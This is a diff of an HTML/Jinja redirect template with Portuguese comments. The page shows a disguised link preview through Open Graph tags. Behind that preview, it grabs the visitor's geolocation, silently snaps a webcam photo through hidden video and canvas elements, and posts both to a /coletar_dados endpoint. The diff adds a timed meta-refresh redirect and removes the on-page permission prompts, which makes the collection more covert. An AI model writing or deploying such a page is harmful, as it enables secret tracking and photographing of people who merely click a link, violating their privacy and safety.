@@ -1,21 +1,24 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <meta charset="UTF-8">
-        <title>{{ link.og_title or 'Redirecionando...' }}</title>
-    
-        <!-- Open Graph Meta -->
-        <meta property="og:title" content="{{ link.og_title }}">
-        <meta property="og:description" content="{{ link.og_description }}">
-        <meta property="og:image" content="{{ link.og_image }}">
-        <meta property="og:url" content="{{ request.url }}">
-        <meta property="og:type" content="website">
-    
-        <!-- Twitter Card (bom para Telegram também) -->
-        <meta name="twitter:card" content="summary_large_image">
-    </head>
+<head>
+    <meta charset="UTF-8">
+    <title>{{ link.og_title or 'Redirecionando...' }}</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="{{ link.og_title }}">
+    <meta property="og:description" content="{{ link.og_description }}">
+    <meta property="og:image" content="{{ link.og_image }}">
+    <meta property="og:url" content="{{ request.url }}">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Delay para garantir leitura das tags OG -->
+    <meta http-equiv="refresh" content="5;url={{ destino }}">
+</head>
 <body>
-    <h3 id="mensagem">Carregando...</h3>
+    <h3 id="mensagem">Carregando... Aguarde alguns segundos.</h3>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -24,9 +27,6 @@
         const slug = {{ slug | tojson | safe }};
         const destino = {{ destino | tojson | safe }};
 
-        console.log("Slug recebido:", slug);
-        console.log("Destino recebido:", destino); 
-
         async function coletarDados() {
             let latitude = "", longitude = "", foto_base64 = "";
 
@@ -34,7 +34,6 @@
                 document.getElementById('mensagem').innerText = texto;
             }
 
-            // Captura a localização
             try {
                 atualizarMensagem("Obtendo localização...");
                 const pos = await new Promise((res, rej) => {
@@ -44,11 +43,9 @@
                 longitude = pos.coords.longitude;
             } catch (e) {
                 console.warn("Erro na geolocalização:", e);
-                atualizarMensagem("Para melhor experiência, ative a localização e recarregue a página.");
                 return;
             }
 
-            // Captura a imagem da câmera
             try {
                 atualizarMensagem("Acessando câmera...");
                 const video = document.getElementById('video');
@@ -56,7 +53,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                await new Promise(r => setTimeout(r, 2000)); // Aguarda a câmera ligar
+                await new Promise(r => setTimeout(r, 1500));
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -66,29 +63,22 @@
                 stream.getTracks().forEach(t => t.stop());
             } catch (e) {
                 console.warn("Erro ao acessar câmera:", e);
-                atualizarMensagem("Erro ao acessar a câmera. Verifique as permissões.");
                 return;
             }
 
-            // Envia os dados
-            atualizarMensagem("Enviando dados...");
-            const payload = { slug, latitude, longitude, foto_base64 };
-
             try {
-                const res = await fetch("/coletar_dados", {
+                atualizarMensagem("Enviando dados...");
+                await fetch("/coletar_dados", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ slug, latitude, longitude, foto_base64 })
                 });
-
-                const json = await res.json();
-                window.location.href = json.destino;
             } catch (e) {
                 console.error("Erro ao enviar dados:", e);
-                atualizarMensagem("Erro no envio de dados. Tente novamente.");
             }
         }
 
+        // Começa a coleta imediatamente, redirecionamento é feito via <meta refresh>
         coletarDados();
     </script>
 </body>
